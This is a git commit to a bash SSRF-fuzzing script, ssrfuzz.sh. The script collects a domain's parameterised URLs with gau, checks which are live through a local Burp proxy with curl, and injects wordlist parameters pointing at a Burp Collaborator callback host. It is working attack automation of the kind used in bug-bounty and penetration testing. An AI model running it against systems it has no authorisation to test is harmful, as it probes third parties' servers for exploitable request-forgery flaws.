066256c44d50a592cba0e0233e89ddb670e357fa
redfr0g <redfr0g@protonmail.com>
2021-04-27 14:54:39 +0200

    Fallback to curl instead of httpx due to network congestion errors

--- ssrfuzz.sh
+++ ssrfuzz.sh
@@ -14,18 +14,25 @@ collaborator=$2
 wordlist=$3
 output="$domain-$(date +'%m-%d-%Y').txt"
 
-#Find known URLs
+#Find known URLs and grep these with parameters
 echo "[+] Finding URLs for domain $domain"
-gau -b ttf,woff,svg,png,jpg,jpeg -subs $domain > $output
+gau -b ttf,woff,svg,png,jpg,jpeg,css $domain | grep "=" | sort -u | grep "?" > $output
 echo "[+] Found $(wc -l < $output) URLs"
 
-# Grep urls with parameters
-echo "[+] Extracting URLs with parameters"
-cat $output | grep "=" | sort -u | grep "?" | httpx -retries 0 -threads 10 -http-proxy http://127.0.0.1:8080 -silent > fuzz.txt
+# Check for alive URLs
+echo "[+] Checking for active URLs"
+echo "" > fuzz.txt
+for url in $(cat $output)
+do
+  if curl -x http://127.0.0.1:8080 --output /dev/null --silent --fail $url; then
+    echo $url >> fuzz.txt
+  else
+    :
+  fi
+done
 echo "[+] Got $(wc -l < fuzz.txt) fuzzable URLs"
 
-echo "[+] Fuzzing parameters (this may take a while)..."
 # Fuzz with Collaborator link and custom URL parameters wordlist (i.e. from ParamMiner)
-xargs -a $wordlist -I@ bash -c 'for url in $(cat fuzz.txt); do echo "$url&@='http://$collaborator'";done' |  httpx -retries 0 -threads 10 -silent -status-code -http-proxy http://127.0.0.1:8080
-
+echo "[+] Fuzzing parameters (this may take a while)..."
+xargs -a $wordlist -I@ bash -c 'for url in $(cat fuzz.txt); do echo "$url&@='http://$collaborator'";done' | xargs curl -s -x http://127.0.0.1:8080 --output /dev/null
 echo "[+] Finished! Check Burp Collaborator for any connections"
